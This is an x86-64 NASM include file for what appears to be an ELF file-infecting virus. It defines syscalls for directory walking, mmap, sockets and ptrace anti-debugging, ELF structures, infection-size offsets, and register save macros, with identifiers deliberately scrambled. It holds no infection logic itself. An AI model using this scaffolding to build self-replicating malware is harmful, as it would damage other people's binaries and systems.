; SYSCALL
%define     SYS_READ        0
%define     SYS_WRITE       1
%define     SYS_OPEN        2
%define     SYS_CLOSE       3
%define  SYS_LSEEK  8
%define  SYS_MMAP  9
%define  SYS_UNMAP  11
%define     SYS_SOCKET      41
%define     SYS_CONNECT     42
%define     SYS_SENDTO      44
%define     SYS_RECVFROM    45
%define     SYS_EXIT        60
%define  SYS_FTRUNCATE 77
%define  SYS_PTRACE  101
%define  SYS_GETPPID  110
%define     SYS_GETDENTS    217

; SOCKET
%define     AF_INET         2
%define     SOCK_STREAM     1

; OPEN
%define  O_RDONLY   0x0000
%define  O_WRONLY   0x0001
%define  O_RDWR    0x0002
%define  O_DIRECTORY   0q0200000
%define     O_CREAT             0x0040

; DIRENT
%define  D_INO_OFF   0x00
%define     D_FOLDER            0x4
%define  D_OFF_OFF   0x08
%define     D_REG_FILE          0x8
%define  D_RECLEN_OFF  0x10
%define  D_TYPE     0x12
%define  D_NAME     0x13

; MMAP
%define  PROT_EXEC  1
%define  PROT_READ  2
%define  PROT_WRITE  4
%define  MAP_SHARED  1
%define  MAP_PRIVATE  2
%define  MAP_ANONYMOUS   0x20

; LSEEK
%define  SEEK_SET   0x0
%define  SEEK_END   0x2

; PTRACE
%define  PTRACE_TRACEME  0x0
%define  PTRACE_DETACH  0x17

%define  CODE_LEN  (YEgcOF - _start)
%define  FINJMP_OFF  (bCg5B - _start)
%define     PAGE_SIZE           0x1000

%define  FAM(x)    [(rbp - OMmzgy78pa_size) + x]
%define  SOCK(x)    [(rbp - sock_size) + x]
%define  INF(x)    [(rbp - AlaG1EQD7S_size) + x]

%define  CODE_LEN   (YEgcOF - _start)
%define  FINJMP_OFF   (bCg5B - _start)
%define  PAGE_SIZE   0x1000

struc OMmzgy78pa
.ZnkWe4leF                resb    PAGE_SIZE
.DljuW:           resb    PAGE_SIZE
.Y1qDXqCN                 resq    1
.xl76m8Qqm:        resd    1
.vjER5l0u:     resd    1
.Bz5zYgT resq    1
endstruc

struc AlaG1EQD7S
.z6iUW6Bl1w   resq 1
.xe3pTfFv   resq 1
.FYqWE   resq 1
.wQYZ3    resb 1
.R6R2oZrVdV  resq 1
.MtcRr7VJ resq 1
.Jan7Jq resq 1
.ArYFEEBAvn  resq 1
.xmBAaIGad  resq 1 
.WVhct4BVn  resq 1
.iOu1TVjYK  resq 1
.EUIpRRY   resb 1
.dYu9R1HYk   resq 1
.hxEhQ  resq 1
.CeMkmhDGM  resq 1
endstruc

; ELF structures
%define PT_LOAD  0x1
%define PT_NOTE  0x4
%define PF_X  0x1
%define PF_R  0x4
%define SHT_PROGBITS 0x1
%define SHT_STRTAB 0x3
%define SHT_NOTE 0x7
%define SHT_RELA 0x4
%define SHF_ALLOC 0x2
%define SHF_EXECINSTR 0x4

struc ZdMqbtRNsW
.Z9CGp:  resb 16
.xX5Yt:  resw 1
.pWN7XnkDP3:  resw 1
.SCUhbF:  resd 1
.c8jczNhnsU:  resq 1
.kg64yuKzIs:  resq 1
.i9Xlu353:  resq 1
.hw6Nrc:  resd 1
.tvbUe:  resw 1
.xujSchnGx5: resw 1
.pJH6qftju:  resw 1
.WcZJUu0: resw 1
.cHC4qT:  resw 1
.o7MjFeR: resw 1
endstruc

struc cKTHtR
.reLrvX:  resd 1
.h9Ldjr:  resd 1
.Gv11FV62k:  resq 1
.eovRiCgZbY:  resq 1
.Lis0YpW:  resq 1
.hJBCdA:  resq 1
.SDrqeU:  resq 1
.qCkSGCKi:  resq 1
endstruc

struc VqnyqBSZy
.C2cKj:  resd 1
.kcIJMEE:  resd 1
.hFbTlViw:  resq 1
.kcXx59zf:  resq 1
.siFHh:  resq 1
.eYSiLJ0o:  resq 1
.DRUMXRoXs:  resd 1
.SnfSf5QM3:  resd 1
.lMbjYhHSi resq 1
.ZWipb2O  resq 1
endstruc

%macro PUSHA 0
push rax
push rbx
push rcx
push rdx
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro POPA 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
pop rax
%endmacro 